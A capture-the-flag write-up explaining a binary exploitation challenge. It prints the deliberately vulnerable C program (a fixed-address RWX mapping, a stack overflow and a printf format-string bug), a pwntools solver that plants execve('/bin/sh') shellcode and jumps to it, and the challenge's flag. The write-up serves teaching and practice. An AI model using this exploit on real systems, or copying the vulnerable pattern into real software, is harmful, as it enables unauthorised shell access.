---
title: "The Safehouse"
area: shellcode
role: author
event: friendly-2026
published: 2026-09-29
summary: "A fixed-address RWX page is filled with shellcode via a format-string write, then a stack overflow jumps to it."
techniques: ["format string", "arbitrary write", "ret2shellcode"]
difficulty: medium
arch: amd64
flag: "Securinets{f1x3d_4ddr355_1s_4lw4ys_th3_s4f3h0us3}"
---

> Category: **pwn** — Tag: **shellcode**
> Flag: `Securinets{f1x3d_4ddr355_1s_4lw4ys_th3_s4f3h0us3}`

The flavor text gives away the whole idea: *"Rootstar keeps one memory
address burned into every single build — same coordinates, every time...
Land your crew there and it becomes a safehouse: executable, unguarded,
always open."* This is a **ret2shellcode** challenge built around a
`mmap()`'d region at a fixed, predictable address.

## 1. The program

```c
/* compile: gcc -o main main.c -lseccomp -Wl,-z,relro,-z,now -pie -no-pie -fno-stack-protector
no pie, full relro, no canary
ret2shellcode
flag path should be sth unknown / random idk
*/

void setup(){
    mmap(
        (void*)0x67676767000,               // <-- fixed address, every run!
        0x1000,
        PROT_READ | PROT_WRITE | PROT_EXEC, // <-- readable, writable, AND executable
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
        -1, 0
    );
    setbuf(stdout,0); setbuf(stdin,0); setbuf(stderr,0);
}

void vuln(){
    char buf[0x200];
    read(0, buf, 0x220);      // <-- reads 0x220 bytes into a 0x200-byte buffer: overflow!
    printf(buf);
    return;
}
```

Two ingredients, both deliberately handed to us by the author's own
comments:

1. **`no canary`** — no stack canary means we can overflow straight
   through to the saved return address without needing to leak/preserve
   any secret cookie value first.
2. **A fixed-address, `RWX` (read+write+**execute**) memory mapping,
   created with `MAP_FIXED`.** `MAP_FIXED` forces the kernel to place this
   mapping at *exactly* `0x67676767000`, every single time the program
   runs — regardless of ASLR settings elsewhere. Combine that with `PROT_EXEC`
   and you have a memory page that (a) is at a known, constant address and
   (b) will happily execute whatever bytes we write into it. That's a
   textbook shellcode landing pad.

`vuln()`'s own bug is a straightforward **stack buffer overflow**:
`char buf[0x200]` but `read(0, buf, 0x220)` allows 32 extra bytes past the
buffer — plenty to reach and overwrite the saved return address.

## 2. The plan

1. Get our own shellcode (`execve("/bin/sh", NULL, NULL)`) written into
   that fixed `0x67676767000` page.
2. Overflow the stack and overwrite the return address to point at that
   page instead.
3. When `vuln()` returns, the CPU jumps into our shellcode and pops a
   shell.

The only wrinkle: **how do we get our shellcode bytes *into* that memory
page in the first place**, when the overflow only lets us write onto the
*stack*, not directly into an `mmap`'d region? `vuln()` doesn't offer a
second `read()` into that region. The answer, visible in `solver.py`, is
to reuse the **format-string bug that's hiding in plain sight**:
`printf(buf)` is called with our raw input as the format string, exactly
like the Radio/Cheat-Code challenges — and `fmtstr_payload()` from
`pwntools` can turn that into an **arbitrary memory write**, capable of
writing our shellcode bytes to *any* address we choose, including the
fixed `mmap` page.

## 3. The exploit — `solver.py`

```python
offset = 0x6
addr = 0x67676767000

target_writes = {
    addr:        0x4850f63148d23148,
    addr + 0x8:  0x68732f6e69622fbf,
    addr + 0x10: 0xb0c031e789485700,
    addr + 0x18: 0x00000000050f903b,
}

payload = fmtstr_payload(offset, target_writes)
# overwrite the rwx section using format string with shellcode
# execve("/bin/sh\x00", NULL, NULL)

payload += b"a"*(0x208-len(payload)) + b"\x00\x70\x76\x76\x76\x06\x00\x00"
# then return to the rwx section

p.sendline(payload)
p.interactive()
```

- **`fmtstr_payload(offset, target_writes)`** is a pwntools helper that
  builds a complete format-string exploitation payload for you: given
  `offset` (which `%N$` argument index first points back into your own
  input — found the same way as in the other challenges, via GDB) and a
  dictionary of `{address: value}`, it automatically works out the right
  combination of `%c` padding and `%n`/`%hn`/`%hhn` writes needed to place
  each value at each address. Here it's used to write four 8-byte chunks
  (`target_writes`) directly into the fixed `mmap` page — those four
  64-bit values, read together in little-endian order, decode to raw x86-64
  machine code implementing `execve("/bin/sh", NULL, NULL)` (the comment
  spells this out directly: *"overwrite the rwx section using format
  string with shellcode execve(/bin/sh\x00,NULL,NULL)"*).
- **`payload += b"a"*(0x208-len(payload)) + b"\x00\x70\x76\x76\x76\x06\x00\x00"`**
  — after the format-string portion has done its writing work, the rest of
  the (now-overflowing) buffer is padded with junk (`b"a"`) up to offset
  `0x208`, and the final 8 bytes overwrite the **saved return address**
  with `p64(0x67676767000)` (`b"\x00\x70\x76\x76\x76\x06\x00\x00"` is
  exactly `0x67676767000` in little-endian bytes — `\x76` repeated matches
  the `0x67676767...`-style address, confirmed by the "fixed
  coordinates" flavor text). When `vuln()` returns, execution jumps
  straight to `0x67676767000` — the page we just filled with shellcode via
  the format-string write — and the shellcode runs, executing
  `/bin/sh`.

Put together: **one payload does two jobs at once** — its early bytes are
a format-string write that plants shellcode at a fixed, executable
address, and its tail bytes are a classic stack overflow that redirects
`vuln()`'s return straight into that shellcode.

## 4. Running it

```bash
python3 solver.py
```
Sends the combined format-string-write + stack-overflow payload; on
return, execution lands in the freshly-written shellcode at
`0x67676767000`, spawning `/bin/sh`.

## 5. Lesson

`MAP_FIXED` + `PROT_EXEC` on a predictable address is a dangerous
combination — it single-handedly defeats ASLR for that region, giving an
attacker a guaranteed, writable-and-executable landing pad. Combining that
with *any* other bug capable of an arbitrary write (here, a second,
easy-to-miss format-string bug) is enough to build working shellcode
in-place and jump to it, even with NX enabled everywhere else.
